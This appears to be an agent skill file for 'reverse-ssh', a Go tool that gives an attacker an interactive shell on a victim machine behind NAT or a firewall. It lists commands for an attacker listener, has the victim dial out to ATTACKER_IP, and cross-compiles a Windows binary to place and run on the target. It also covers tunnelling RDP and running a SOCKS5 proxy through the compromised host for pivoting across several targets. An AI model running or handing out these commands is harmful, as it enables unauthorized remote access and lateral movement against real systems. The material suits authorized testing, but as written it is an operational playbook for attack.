---
name: reverse-ssh
description: "Auth/lab ref: Establish reverse SSH tunnels from victim to attacker for interactive shell access behind NAT/firewall."
license: MIT
compatibility: "Go binary; Linux/macOS/Windows."
metadata:
  author: AeonDave
  version: "1.0"
---

# Reverse-SSH

Reverse SSH server/tunnel for resilient shell access when inbound connectivity to target is blocked.

## Quick Start

```bash
# Attacker listener mode
./reverse-ssh -l -p 31337

# Victim dials home
./reverse-ssh -p 31337 <attacker-ip>

# Attacker connects to reverse-bound shell port
ssh -p 8888 127.0.0.1
```

## Common Flags

| Flag | Purpose |
|------|---------|
| `-l` | Listen mode (bind scenario) |
| `-p PORT` | SSH port to listen/dial (default 31337) |
| `-b PORT` | Reverse scenario bind port on attacker side (default 8888) |
| `-s SHELL` | Shell to spawn (`/bin/bash`, cmd path hints, etc.) |
| `-N` | Deny shell/exec/subsystem/local-forward requests |
| `--socks5` | Enable SOCKS5 proxy |
| `-v` | Verbose logs |

## Common Workflows

**Deploy reverse shell:**
```bash
# Compile for Windows target (from Linux)
GOOS=windows GOARCH=amd64 go build -o rev.exe .
# Transfer to victim, execute:
rev.exe -p 31337 ATTACKER_IP
```

**Port forwarding via reverse SSH:**
```bash
# From attacker, tunnel internal RDP over obtained SSH endpoint
ssh -p 8888 -L 3389:127.0.0.1:3389 127.0.0.1
# Connect RDP client to localhost:3389
```

**SOCKS5 proxy:**
```bash
# Open SSH dynamic forwarding via recovered endpoint
ssh -p 8888 -D 1080 127.0.0.1
```

## Hardening Before Use

- Replace default credentials at compile time (`RS_PASS`, `RS_PUB`).
- Set explicit `BPORT` to avoid collisions during multi-target operations.
- Use `-N` in listener-only workflows where shell execution is not required.

## Resources

| File | When to load |
|------|--------------|
| `references/deployment-and-hardening.md` | Precise port model (`-p` vs `-b`), hardened build flags, safer deployment patterns |
